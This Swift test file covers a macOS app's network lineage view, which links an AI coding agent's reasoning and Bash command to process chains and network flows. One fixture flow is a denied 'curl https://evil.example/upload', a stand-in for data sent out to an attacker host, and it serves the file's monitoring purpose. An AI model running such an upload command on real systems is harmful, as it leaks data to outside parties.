#if os(macOS)
import AppKit
import SwiftUI
import Testing
@testable import bromure_ac

@Suite("Network lineage view")
@MainActor
struct NetworkLineageViewTests {
    static func flow(_ pid: UUID, proto: String, dst: String, port: Int, decision: String, layer: String?,
                     tool: String?, processes: [(Int, String, String, String)], host: String? = nil,
                     reason: String? = nil, viaProxy: Bool = false, at: Date) -> SecurityTimeline.Event {
        var d: [String: AnyJSON] = [
            "proto": .string(proto), "dst": .string(dst), "dport": .int(port), "decision": .string(decision), "count": .int(1),
            "processes": .array(processes.map { .object(["pid": .int($0.0), "comm": .string($0.1), "exe": .string($0.2), "argv": .string($0.3)]) }),
        ]
        if let layer { d["layer"] = .string(layer) }
        if let host { d["host"] = .string(host) }
        if let reason { d["reason"] = .string(reason) }
        if viaProxy { d["via_proxy"] = .bool(true) }
        if let tool {
            d["agent"] = .object(["tool": .string("Bash"), "tool_use_id": .string(tool), "confidence": .string("exact")])
            d["command"] = .string("ping -c1 1.1.1.1 && curl -s https://example.com/")
        }
        var e = SecurityTimeline.map(profileID: pid, eventType: "net.flow", eventData: d, now: at)!
        e.eventType = "net.flow"; e.detail = d; e.workspace = "my-app"
        return e
    }

    static func sample() -> (SecurityTimeline, SecurityTimeline.Event) {
        let t = SecurityTimeline(directory: nil)
        let pid = UUID(), t0 = Date(timeIntervalSince1970: 1_790_800_000)
        let chain = [(412, "claude", "/usr/bin/node", "claude"),
                     (980, "bash", "/usr/bin/bash", "/bin/bash -c -l source ~/.claude/shell-snapshots/snapshot-bash-1.sh && eval 'ping -c1 1.1.1.1 && curl -s https://example.com/' < /dev/null"),
                     (981, "ping", "/usr/bin/ping", "ping -c1 1.1.1.1")]
        var r = SecurityTimeline.map(profileID: pid, eventType: "agent.reasoning", eventData: [:], now: t0)
        let rd: [String: AnyJSON] = ["tool_use_id": .string("toolu_01"), "tool": .string("Bash"),
            "text": .string("The deploy failed with a timeout. Before digging into the app, let me check that this machine can reach the internet at all, then fetch the health page directly."),
            "truncated": .bool(false),
            "prompt": .string("The deploy keeps timing out. Can you figure out why?"),
            "intent": .string("Ping Cloudflare DNS once, then fetch the health page")]
        r = SecurityTimeline.map(profileID: pid, eventType: "agent.reasoning", eventData: rd, now: t0)
        r?.eventType = "agent.reasoning"; r?.detail = rd
        let ping = flow(pid, proto: "icmp", dst: "1.1.1.1", port: 0, decision: "unfiltered", layer: nil, tool: "toolu_01",
                        processes: chain, at: t0.addingTimeInterval(1))
        let curl = flow(pid, proto: "tcp", dst: "example.com", port: 443, decision: "allow", layer: "proxy", tool: "toolu_01",
                        processes: [chain[0], chain[1], (982, "curl", "/usr/bin/curl", "curl -s https://example.com/")],
                        viaProxy: true, at: t0.addingTimeInterval(2))
        let evil = flow(pid, proto: "tcp", dst: "evil.example", port: 443, decision: "deny", layer: "l7", tool: "toolu_01",
                        processes: [chain[0], chain[1], (983, "curl", "/usr/bin/curl", "curl https://evil.example/upload")],
                        reason: "no matching network policy", viaProxy: true, at: t0.addingTimeInterval(3))
        for e in [r!, ping, curl, evil] { t.append(e) }
        return (t, ping)
    }

    @Test("The lineage joins reasoning, tool call, processes and sibling flows")
    func joins() throws {
        let (t, ping) = Self.sample()
        let l = try #require(FlowLineage(event: ping, all: t.allEvents))
        #expect(l.reasoning?.hasPrefix("The deploy failed") == true)
        #expect(l.tool == "Bash" && l.command == "ping -c1 1.1.1.1 && curl -s https://example.com/")
        #expect(l.processes.map(\.comm) == ["claude", "bash", "ping"])
        #expect(l.decision == "unfiltered" && l.siblings.count == 2)
    }

    /// `BROMURE_SHOT_DIR=/path swift test --filter NetworkLineageViewTests`
    /// writes PNGs of the sheet, light and dark, for review.
    @Test("Render the sheet (screenshots on demand)")
    func render() throws {
        guard let dir = ProcessInfo.processInfo.environment["BROMURE_SHOT_DIR"] else { return }
        let (t, ping) = Self.sample()
        for (name, scheme) in [("light", ColorScheme.light), ("dark", .dark)] {
            let view = NetworkLineageView(timeline: t, focus: ping, onClose: {}, scrolls: false)
                .frame(width: 760)
                .fixedSize(horizontal: false, vertical: true)
                .environment(\.colorScheme, scheme)
            let r = ImageRenderer(content: view)
            r.scale = 2
            guard let img = r.nsImage, let tiff = img.tiffRepresentation,
                  let png = NSBitmapImageRep(data: tiff)?.representation(using: .png, properties: [:]) else {
                Issue.record("render failed"); return
            }
            try png.write(to: URL(fileURLWithPath: dir).appendingPathComponent("lineage-\(name).png"))
        }
    }
}
#endif
